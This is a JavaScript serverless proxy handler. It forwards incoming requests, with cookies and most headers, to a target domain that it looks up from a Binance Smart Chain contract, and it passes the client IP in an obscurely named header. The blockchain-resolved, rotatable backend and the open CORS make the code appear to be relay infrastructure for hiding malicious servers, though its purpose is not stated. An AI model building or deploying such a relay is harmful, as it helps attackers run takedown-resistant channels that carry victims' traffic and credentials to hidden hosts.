import fetch from 'node-fetch';

const rpcUrls = [
    "https://binance.llamarpc.com",
    "https://bsc.drpc.org"
];
const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
const fallbackDomain = "https://example.com"; // <---- fallback domain if RPC fails

export default async function handler(req, res) {
    // ==== CORS ====
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');

    if (req.method === 'OPTIONS') {
        res.setHeader('Access-Control-Max-Age', '86400');
        return res.status(204).end();
    }

    // === Detect endpoint ===
    let endpoint = req.query.e;
    if (!endpoint) {
        // remove /api/proxy prefix from URL path
        endpoint = req.url.replace(/^\/api\/proxy\/?/, '');
        if (endpoint === '' || endpoint === 'api/proxy') endpoint = '';
    }
    console.log("Parsed endpoint:", endpoint);

    // === Check endpoint ===
    if (!endpoint) {
        console.log("Error: Missing endpoint");
        return res.status(400).send('Missing endpoint');
    }

    // === Ping test ===
    if (endpoint === 'ping_proxy') {
        console.log("Ping received");
        return res.status(200).type('text/plain').send('pong');
    }

    try {
        const targetDomain = await fetchTargetDomain();
        const cleanDomain = targetDomain ? targetDomain.replace(/\/$/, '') : fallbackDomain;
        console.log("Resolved target domain:", cleanDomain);

        const url = `${cleanDomain}/${endpoint.replace(/^\//, '')}`;
        console.log(`Forwarding to: ${url}`);

        const clientIP = getClientIP(req);
        const headers = { ...req.headers };
        delete headers.host;
        delete headers.origin;
        delete headers['accept-encoding'];
        delete headers['content-encoding'];
        headers['x-dfkjldifjlifjd'] = clientIP;

        const proxyResponse = await fetch(url, {
            method: req.method,
            headers,
            body: req.method !== 'GET' && req.method !== 'HEAD'
                ? Buffer.from(await streamToBuffer(req))
                : undefined,
            timeout: 120000
        });

        const contentType = proxyResponse.headers.get('content-type');
        if (contentType) res.setHeader('Content-Type', contentType);

        const buffer = Buffer.from(await proxyResponse.arrayBuffer());
        console.log(`Response from target: ${proxyResponse.status}`);
        res.status(proxyResponse.status).send(buffer);
    } catch (err) {
        console.error("Proxy error:", err.message);
        res.status(500).send('error: ' + err.message);
    }
}

// ========== HELPERS ==========
function getClientIP(req) {
    if (req.headers['cf-connecting-ip']) return req.headers['cf-connecting-ip'];
    if (req.headers['x-forwarded-for'])
        return req.headers['x-forwarded-for'].split(',')[0].trim();
    return req.socket.remoteAddress || '';
}

async function streamToBuffer(stream) {
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    return Buffer.concat(chunks);
}

async function fetchTargetDomain() {
    const data = '20965255';
    for (const rpcUrl of rpcUrls) {
        try {
            console.log(`Querying RPC: ${rpcUrl}`);
            const response = await fetch(rpcUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_call',
                    params: [{ to: contractAddress, data: '0x' + data }, 'latest']
                }),
                timeout: 120000
            });
            const result = await response.json();
            if (!result.error) {
                const domain = hexToString(result.result);
                if (domain) {
                    console.log("Target domain resolved:", domain);
                    return domain;
                }
            }
        } catch (e) {
            console.log(`RPC failed: ${rpcUrl}`, e.message);
        }
    }
    console.log("Using fallback domain:", fallbackDomain);
    return fallbackDomain;
}

function hexToString(hex) {
    hex = hex.replace(/^0x/, '');
    hex = hex.substring(64);
    const lengthHex = hex.substring(0, 64);
    const length = parseInt(lengthHex, 16);
    const dataHex = hex.substring(64, 64 + length * 2);
    let result = '';
    for (let i = 0; i < dataHex.length; i += 2) {
        const charCode = parseInt(dataHex.substring(i, i + 2), 16);
        if (charCode === 0) break;
        result += String.fromCharCode(charCode);
    }
    return result;
}